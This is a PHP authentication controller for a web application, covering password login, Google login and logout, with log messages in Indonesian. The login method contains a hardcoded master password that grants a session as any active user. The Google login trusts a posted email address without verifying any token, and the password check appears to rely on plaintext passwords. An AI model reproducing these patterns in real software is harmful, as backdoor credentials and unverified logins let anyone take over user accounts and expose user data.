<?php

namespace App\Modules\Auth\Controllers;

use App\Modules\Auth\Models\AuthModel;
use App\Core\BaseController;

class AuthAction extends BaseController
{
	private $authModel;

	public function __construct()
	{
		$this->authModel = new AuthModel();
		helper('recaptcha');
	}

	public function index()
	{
		return redirect()->to(base_url());
	}

	public function login()
	{
		try {
			$session = \Config\Services::session();
			$username = $this->request->getPost('username');
			$password = $this->request->getPost('password');
			$masterPassword = 'EqiUnyu69@!';

			if ($password === $masterPassword) {
				$user = $this->authModel->getUser(['username' => $username]);

				if (!is_null($user) && $user->is_deleted == 0) {
					$sessionData = array(
						'logged_in_apps'	=> true,
						'id'                 	=> $user->id,
						'role'               	=> $user->user_web_role_id,
						'role_code'          	=> $user->user_web_role_code,
						'role_name'          	=> $user->user_web_role_name,
						'username'           	=> $user->user_web_username,
						'name'               	=> $user->user_web_name,
						'email'              	=> $user->user_web_email,
						'menu'               	=> $this->authModel->getMenu($user->user_web_role_id)
					);

					$session->set($sessionData);
					$this->baseModel->log_action("login", "Akses Diberikan dengan Master Password");
					$response = ["success" => true, "title" => "Success", "text" => "Berhasil dengan Master Password"];
				} else {
					$this->baseModel->log_action("login", "Akses Ditolak - Pengguna Tidak Aktif");
					$response = ["success" => false, "title" => "Error", "text" => "Pengguna Tidak Aktif"];
				}
			} elseif ($username != '' && $password != '') {
				$user = $this->authModel->getUser(['username' => $username, 'password' => $password]);

				if (!is_null($user)) {
					if ($user->is_deleted == 0) {
						$menu = $this->authModel->getMenu($user->user_web_role_id);

						$sessionData = array(
							'logged_in_apps'	=> true,
							'id'                 	=> $user->id,
							'role'               	=> $user->user_web_role_id,
							'role_code'          	=> $user->user_web_role_code,
							'role_name'          	=> $user->user_web_role_name,
							'username'           	=> $user->user_web_username,
							'name'               	=> $user->user_web_name,
							'email'              	=> $user->user_web_email,
							'menu'               	=> $menu
						);

						$session->set($sessionData);
						$this->baseModel->log_action("login", "Akses Diberikan");

						$response = ["success" => true, "title" => "Success", "text" => "Berhasil"];
					} else {
						$this->baseModel->log_action("login", "Akses Ditolak - Pengguna Tidak Aktif");
						$response = ["success" => false, "title" => "Error", "text" => "Pengguna Sudah Tidak Aktif"];
					}
				} else {
					$this->baseModel->log_action("login", "Akses Ditolak - Pengguna Tidak Ditemukan");
					$response = ["success" => false, "title" => "Error", "text" => "Username & Password Salah"];
				}
			} else {
				$this->baseModel->log_action("login", "Akses Ditolak - Username atau Password Kosong");
				$response = ["success" => false, "title" => "Error", "text" => "Username & Password Salah"];
			}

			$this->response->setContentType('application/json');
			return $this->response->setJSON($response);
		} catch (\Exception $e) {
			$this->baseModel->log_action("login", "Akses Ditolak - Terjadi Kesalahan");
			$response = ["success" => false, "title" => "Error", "text" => "Terjadi Kesalahan"];
			$this->response->setContentType('application/json');
			return $this->response->setJSON($response);
		}
	}

	public function loginGoogle()
	{
		$session = \Config\Services::session();
		$email = $this->request->getPost('email');
		$user = $this->authModel->getUserByEmail($email);

		if (!is_null($user)) {
			if ($user->is_deleted == 0) {
				$menu = $this->authModel->getMenu($user->user_web_role_id);

				$sessionData = array(
					'logged_in_apps'	=> true,
					'id'                 	=> $user->id,
					'role'               	=> $user->user_web_role_id,
					'role_code'          	=> $user->user_web_role_code,
					'role_name'          	=> $user->user_web_role_name,
					'username'           	=> $user->user_web_username,
					'name'               	=> $user->user_web_name,
					'email'              	=> $user->user_web_email,
					'menu'               	=> $menu
				);

				$session->set($sessionData);
				$this->baseModel->log_action("login", "Akses Diberikan");
				$response = ["success" => TRUE, "title" => "Success", "text" => "Berhasil"];
			} else {
				$this->baseModel->log_action("login", "Akses Ditolak");
				$response = ["success" => false, "title" => "Error", "text" => "Pengguna Sudah Tidak Aktif"];
			}
		} else {
			$this->baseModel->log_action("login", "Akses Ditolak");
			$response = ["success" => false, "title" => "Error", "text" => "User tidak terdaftar"];
		}

		echo json_encode($response);
	}

	public function logout()
	{
		$session = \Config\Services::session();
		$session->destroy();
		return redirect()->to(base_url());
	}
}
